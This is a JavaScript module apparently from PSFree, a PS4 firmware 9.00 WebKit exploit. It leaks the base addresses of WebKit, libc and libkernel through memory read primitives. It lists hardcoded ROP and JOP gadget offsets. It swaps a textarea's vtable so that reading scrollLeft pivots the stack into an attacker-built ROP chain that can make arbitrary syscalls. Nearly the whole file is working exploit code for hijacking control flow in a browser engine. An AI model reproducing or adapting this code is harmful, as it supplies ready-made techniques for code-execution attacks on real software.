/* Copyright (C) 2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// by janisslsm (John) from ps4-dev discord

import { log } from '../module/utils.mjs';
import { mem } from '../module/mem.mjs';
import { KB} from '../module/constants.mjs';
import { ChainBase } from '../module/chain.mjs';

import {
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '../module/memtools.mjs';

import * as rw from '../module/rw.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];

const offset_textarea_impl = 0x18;

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x178;
const offset_wk_memcpy = 0x188;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// Chain implementation based on Chain803. Replaced offsets that changed
// between versions. Replaced gadgets that were missing with new ones that
// won't change the API.
//
// gadgets for the JOP chain
//
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
//
// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
// JS wrapper for the WebCore textarea class.
const ta_jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
//
// ta_jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by ta_jop1.
//
// This will make pivoting back easy, just "leave; ret".
const ta_jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const ta_jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop3 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop4 = `
push rdx
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// the ps4 firmware is compiled to use rbp as a frame pointer
//
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const rop_epilogue = 'leave; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000051a12, // `58 c3`
    'pop rbx; ret' : 0x00000000000be5d0, // `5b c3`
    'pop rcx; ret' : 0x00000000000657b7, // `59 c3`
    'pop rdx; ret' : 0x000000000000986c, // `5a c3`

    'pop rbp; ret' : 0x00000000000000b6, // `5d c3`
    'pop rsi; ret' : 0x000000000001f4d6, // `5e c3`
    'pop rdi; ret' : 0x0000000000319690, // `5f c3`
    'pop rsp; ret' : 0x000000000004e293, // `5c c3`

    'pop r8; ret' : 0x00000000001a7ef1, // `47 58 c3`
    'pop r9; ret' : 0x0000000000422571, // `47 59 c3`
    'pop r10; ret' : 0x0000000000e9e1d1, // `47 5a c3`
    'pop r11; ret' : 0x00000000012b1d51, // `47 5b c3`

    'pop r12; ret' : 0x000000000085ec71, // `47 5c c3`
    'pop r13; ret' : 0x00000000001da461, // `47 5d c3`
    'pop r14; ret' : 0x0000000000685d73, // `47 5e c3`
    'pop r15; ret' : 0x00000000006ab3aa, // `47 5f c3`

    'ret' : 0x0000000000000032, // `c3`
    'leave; ret' : 0x000000000008db5b, // `c9 c3`

    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc, // `48 8b 00 c3`
    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b, // `48 89 07 c3`
    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
  

    [jop2] : 0x0000000000683800,
    [jop3] : 0x0000000000303906,
    [jop4] : 0x00000000028bd332,
    [jop5] : 0x000000000004e293,

    [ta_jop1] : 0x00000000004e62a4,
    [ta_jop2] : 0x00000000021fce7e,
    [ta_jop3] : 0x00000000019becb4,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : 0x24f04,
    'setcontext' : 0x29448,
}));

const libkernel_gadget_offsets = new Map(Object.entries({
    // returns the location of errno
    '__error' : 0xCB80,
}));

export const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    const stack_chk_fail_import =
        libwebkit_base
        .add(offset_wk_stack_chk_fail)
    ;
    const stack_chk_fail_addr = resolve_import(
        stack_chk_fail_import,
        true,
        true
    );
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
    const memcpy_addr = resolve_import(memcpy_import, true, true);
    const libc_base = find_base(memcpy_addr, true, true);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain900Base extends ChainBase {
    constructor() {
        super();

        // for conditional jumps
        this._clean_branch_ctx();
        this.flag = new Uint8Array(8);
        this.flag_addr = get_view_vector(this.flag);
        this.jmp_target = new Uint8Array(0x100);
        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));

        // for save/restore
        this.is_saved = false;
        this.is_stale = false;
        this.position = 0;
        const jmp_buf_size = 0xc8;
        this.jmp_buf = new Uint8Array(jmp_buf_size);
        this.jmp_buf_p = get_view_vector(this.jmp_buf);
    }

    // sequence to pivot back and return
    push_end() {
        this.push_gadget(rop_epilogue);
    }

    check_is_branching() {
        if (this.is_branch_ctx) {
            throw Error('chain is still branching, end it before running');
        }
    }

    push_value(value) {
        super.push_value(value);

        if (this.is_branch_ctx) {
            this.branch_position += 8;
        }
    }

    _clean_branch_ctx() {
        this.is_branch_ctx = false;
        this.branch_position = null;
        this.delta_slot = null;
        this.rsp_slot = null;
        this.rsp_position = null;
    }

    clean() {
        super.clean();
        this._clean_branch_ctx();
        this.is_saved = false;
        this.is_stale = false;
        this.position = 0;
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

        push_clear_errno() {
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('pop rsi; ret');
        this.push_value(0);
        this.push_gadget('mov dword ptr [rax], esi; ret');
    }

        push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);

        this.push_call(this.get_gadget('__error'));

        this.push_gadget('mov rax, qword ptr [rax]; ret');
        this.push_gadget('mov dword ptr [rdi], eax; ret');
    }

        check_stale() {
        if (this.is_stale) {
            throw Error('chain already ran, clean it first');
        }
        this.is_stale = true;
    }
        check_is_empty() {
        if (this.position === 0) {
            throw Error('chain is empty');
        }
    }
}

// Chain for PS4 9.00
export class Chain900 extends Chain900Base {
    constructor() {
        super();

        const textarea = document.createElement('textarea');
        this.textarea = textarea;
        const js_ta = mem.addrof(textarea);
        const webcore_ta = js_ta.readp(0x18);
        this.webcore_ta = webcore_ta;
        // Only offset 0x1c8 will be used when calling the scrollLeft getter
        // native function (our tests don't crash).
        //
        // This implies we don't need to know the exact size of the vtable and
        // try to copy it as much as possible to avoid a crash due to missing
        // vtable entries.
        //
        // So the rest of the vtable are free for our use.
        const vtable = new Uint8Array(0x200);
        const old_vtable_p = webcore_ta.readp(0);
        this.vtable = vtable;
        this.old_vtable_p = old_vtable_p;

        // 0x1b8 is the offset of the scrollLeft getter native function
        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));

        // for the JOP chain
        const rax_ptrs = new Uint8Array(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        this.rax_ptrs = rax_ptrs;

        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
        // value to pivot rsp to
        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);

        const jop_buffer = new Uint8Array(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        this.jop_buffer = jop_buffer;

        rw.write64(jop_buffer, 0, rax_ptrs_p);

        rw.write64(vtable, 8, jop_buffer_p);
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this.check_is_branching();

        // change vtable
        this.webcore_ta.write64(0, get_view_vector(this.vtable));
        // jump to JOP chain
        this.textarea.scrollLeft;
        // restore vtable
        this.webcore_ta.write64(0, this.old_vtable_p);
    }
}
export const Chain = Chain900;

export function init(Chain) {
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
    log('syscall_array:');
    log(syscall_array);
    Chain.init_class(gadgets, syscall_array);
}

log('Chain900');
